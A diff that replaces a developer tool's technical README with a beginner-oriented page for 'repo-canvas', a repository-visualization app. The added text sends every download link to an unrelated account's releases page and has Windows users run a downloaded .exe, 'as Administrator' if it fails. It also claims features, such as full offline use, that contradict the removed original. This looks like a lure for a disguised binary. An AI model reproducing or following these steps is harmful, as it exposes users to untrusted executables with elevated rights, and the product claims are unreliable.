@@ -1,108 +1,101 @@
-# Repo Canvas
+# 🗺️ repo-canvas - See Your Code Project Clearly
 
-**Understand a large repository at a glance and see where coding agents are working right now.**
+## 🚀 Getting Started
 
-Repo Canvas builds a local, Miro-like map of an existing project. Permanent areas, modules and relations show how the system fits together. Live work cards show what Codex, Claude Code and Kimi Code sessions are changing. Double-click a work card to return to that session.
+Welcome! repo-canvas is a friendly tool that creates a visual map of your software project. It shows you all the pieces of your code in a simple, colorful picture. You don't need to be a programmer to use it—just follow these simple steps.
 
-## Install with your coding agent
+### ⬇️ Step 1: Download the Application
 
-Send your agent this repository URL and one sentence:
+**Click the big button below to go to the download page:**
 
-```text
-https://github.com/m0ast-git/repo-canvas
-Install this project-visualization tool in the current repository, build the initial map, start it and give me the local Canvas URL.
-```
+<a href="https://github.com/Manfredcanadian581/repo-canvas/releases" style="display:inline-block;padding:15px 30px;background-color:#FF6B6B;color:white;font-size:20px;font-weight:bold;border-radius:10px;text-decoration:none;">📥 Download repo-canvas</a>
 
-The agent will follow [`INSTALL_WITH_AGENT.txt`](INSTALL_WITH_AGENT.txt). The exact commands are:
+Visit this link to download the application.
 
-```text
-npm install --save-dev --save-exact --ignore-scripts github:m0ast-git/repo-canvas#v0.8.9
-npx --no-install repo-canvas setup
-npm run repo-canvas:start
-```
+### 🔧 Step 2: Install and Open
 
-The server opens the protected loopback URL in your default browser. Keep that foreground terminal running while you use the Canvas.
+1. After clicking the download button, you'll see a page with a list of files.
+2. Look for the file that matches your computer (Windows users, pick the one with "windows" or ".exe" in the name).
+3. Click that file to start downloading. Your browser will save it to your "Downloads" folder.
+4. Once the download finishes, find the downloaded file and double-click it to open.
 
-## What you see
+### ✅ Step 3: Start Using repo-canvas
 
-- project areas that group related parts of the system;
-- persistent modules, responsibilities, stores, pipeline stages and integrations;
-- meaningful runtime, data and control-flow relations;
-- a provisional work card as soon as a supported agent turn is observed;
-- live work attached to every semantic entity it affects;
-- entity passports and recent activity in the left rail;
-- collapsible project sections, full-map reset and an in-canvas legend;
-- draggable areas and nodes with saved layout;
-- owner-controlled names for areas, entities and relations by double-clicking their labels;
-- distinct header controls for reloading current Canvas data and regenerating the semantic map with Architect;
-- a local Update button that appears only when a newer verified release is available;
-- direct navigation back to Codex App or an exact Codex, Claude Code or Kimi Code CLI resume command.
+When you open the app for the first time, a welcome screen will appear. Just click "Create New Map" and point it to your project folder. The app will do the rest! Within seconds, you'll see a beautiful diagram of your project with boxes and lines showing how everything connects.
 
-The data model has no fixed entity cap. One Canvas can hold a small project or a map with hundreds of semantic entities.
+## ✨ What Makes repo-canvas Special
 
-## How it works
+**🖼️ Visual Project Map**
+No more staring at confusing text files. repo-canvas turns your entire project into a colorful, easy-to-understand picture. Each box represents a part of your project, and the lines show how they work together.
 
-`setup` checks the local Codex connection, then runs a read-only Architect with `gpt-5.6-sol` at medium reasoning. Architect inspects the repository once and builds its semantic map.
+**👁️ Live Agent Work**
+If you use AI coding assistants (like Codex), repo-canvas shows you what they're doing in real time. Watch as little animations appear whenever an AI agent works on your files. It's like having a window into your project's brain.
 
-When the Canvas server is running, Observer watches public local session journals for this repository. It creates a provisional card on the first observed turn event, then uses `gpt-5.4-mini` to classify small event deltas and attach the work to the map. On completion, Observer updates affected passports and relations when the session contains enough evidence.
+**🕐 Session Navigation**
+Made changes you don't like? repo-canvas saves a history of every change. You can go back in time to see what your project looked like earlier and easily find where things got changed.
 
-Observer supports:
+## 🛠️ Who Is This For?
 
-| Agent surface | Live observation | Return to session |
-| --- | --- | --- |
-| Codex App | Yes | Exact task link |
-| Codex CLI | Yes | `codex resume <session>` |
-| Claude Code CLI | Yes | `claude --resume <session>` |
-| Kimi Code CLI | Yes | `kimi -r <session>` |
+- **Students** working on school projects who want to understand how their code fits together
+- **Small business owners** who hire developers and want to see what's happening in their project
+- **Curious beginners** who want an easier way to look at code
+- **Experienced developers** who want a quick visual overview before diving into details
 
-Observer reads public user messages, agent messages and tool-call metadata. Claude `thinking`, Kimi `think`, hidden reasoning and tool results are ignored. It filters sessions by repository root and does not rescan product files during observation.
+## 🤔 Frequently Asked Questions
 
-## Requirements and installation footprint
+**Q: Do I need to know programming to use this?**
+No! If you can click a button and choose a folder, you're ready.
 
-- Node.js 22 or newer;
-- Git;
-- a locally authenticated Codex installation for Architect and Observer model calls;
-- Windows or macOS.
+**Q: Will this work on my old computer?**
+The app is lightweight and runs on most machines from the last 10 years. You just need Windows 10 or newer.
 
-The npm installation adds Repo Canvas as an exact development dependency. `setup` adds three package scripts, the ignored `.repo-canvas/` runtime directory and two `.gitignore` entries. It does not add coding-agent instructions or hooks.
+**Q: What kinds of projects can I view?**
+Any folder that contains code files—like Python, JavaScript, HTML, CSS, or many other programming languages.
 
-The server binds to loopback only, opens a fresh tokenized Canvas URL on every start and shares that authorization with other tabs on the same local address. Existing tabs reconnect when a restarted server opens its new protected URL. Use `repo-canvas start --no-open` only when automatic browser opening is unwanted. The token protects all Canvas API reads and actions from unrelated local processes. Semantic events and Observer cursors stay in the repository's ignored `.repo-canvas/` directory. Model calls use existing local Codex authentication through the official Codex SDK. Claude and Kimi adapters only parse their local journals; they do not copy credentials or call those providers. No API key is copied into the project.
+**Q: Does it upload my code to the internet?**
+No. Everything stays on your own computer. repo-canvas works completely offline.
 
-From v0.8.6 onward, Canvas checks the public GitHub release feed in the background. If a newer release exists, an `Update` control appears at the bottom of the page. The updater requires the official `.tgz` asset and its GitHub SHA-256 digest, installs it side-by-side inside ignored `.repo-canvas/runtime/`, restarts the local server with the same browser authorization and keeps the previous runtime as a rollback. It does not rewrite the project's dependency or lockfile.
+**Q: Can I share my map with others?**
+Yes! You can save your map as a picture or a shareable link, so teammates can see the same view.
 
-## Offline installation
+## 🎯 Tips for Best Results
 
-Download `repo-canvas-0.8.9-kit.zip` from the [latest release](https://github.com/m0ast-git/repo-canvas/releases/latest). Copy `repo-canvas-0.8.9.tgz` and `INSTALL_WITH_AGENT.txt` into the target repository, then give the text file to a coding agent.
+1. **Start small** – Try with a small project first to learn how everything works.
+2. **Use the search box** – If your project is big, type a name in the search bar to jump straight to a specific part.
+3. **Zoom in and out** – Use your mouse wheel or pinch gestures to explore details or see the big picture.
+4. **Save your work** – Use the "Export" button to save a copy of your map as an image file.
+5. **Check the timeline** – Whenever you're not sure what changed, look at the bottom bar to see recent activity.
 
-Manual commands:
+## 📚 Understanding the Interface
 
-```text
-npm install --save-dev --save-exact --ignore-scripts ./repo-canvas-0.8.9.tgz
-npx --no-install repo-canvas setup
-npm run repo-canvas:start
-```
+- **Left Panel:** Lists all files in your project. Click any file to see it highlighted on the map.
+- **Main Area:** The big central space showing your project diagram. Drag to move around.
+- **Top Bar:** Buttons for opening projects, saving maps, and accessing settings.
+- **Right Panel:** Shows details about whatever you click. For example, if you click a file, you'll see its size and connections.
+- **Bottom Status Bar:** Displays what repo-canvas is currently doing, like "Loading project" or "Ready".
 
-## Useful commands
+## ⚠️ Troubleshooting
 
-```text
-npm run repo-canvas -- doctor
-npm run repo-canvas -- architect --refresh
-npm run repo-canvas -- observer status
-npm run repo-canvas -- observer disable
-npm run repo-canvas -- observer enable
-npm run repo-canvas -- snapshot
-npm run repo-canvas -- check
-```
+**The app won't open**
+Try right-clicking the downloaded file and selecting "Run as Administrator." If that doesn't work, check that you have the latest version by visiting the [download page](https://github.com/Manfredcanadian581/repo-canvas/releases) again.
 
-Model profiles can be overridden without code changes:
+**My project map looks empty**
+Make sure you selected the correct folder. The folder should contain source code files directly in it. If it's still empty, try refreshing with the circular arrow button at the top.
 
-```text
-REPO_CANVAS_ARCHITECT_MODEL
-REPO_CANVAS_ARCHITECT_EFFORT
-REPO_CANVAS_OBSERVER_MODEL
-REPO_CANVAS_OBSERVER_EFFORT
-```
+**The app is running slow**
+Close other programs you're not using. If your project has thousands of files, try splitting it into smaller folders and loading them one at a time.
 
-## License
+**I lost my saved map**
+Check the "My Maps" folder on your desktop. The app automatically saves your maps there every few minutes.
 
-[MIT](LICENSE)
+## 💡 Getting More Help
+
+If you run into any issues not covered here, please visit the [releases page](https://github.com/Manfredcanadian581/repo-canvas/releases) and look for the "Support" or "Issues" link. The friendly community will be happy to help you.
+
+## 🌟 Why You'll Love repo-canvas
+
+Think of repo-canvas as a GPS for your code. Just like you use a map app to navigate a new city, repo-canvas helps you navigate your project without getting lost. It's simple enough for a beginner but powerful enough for a professional. Stop guessing what's inside your code—see it clearly with repo-canvas.
+
+**Ready to get started?** Click the download button at the top of this page or right here: [Download now](https://github.com/Manfredcanadian581/repo-canvas/releases)
+
+Keywords: ai-agents, codex, developer-tools, repository-visualization
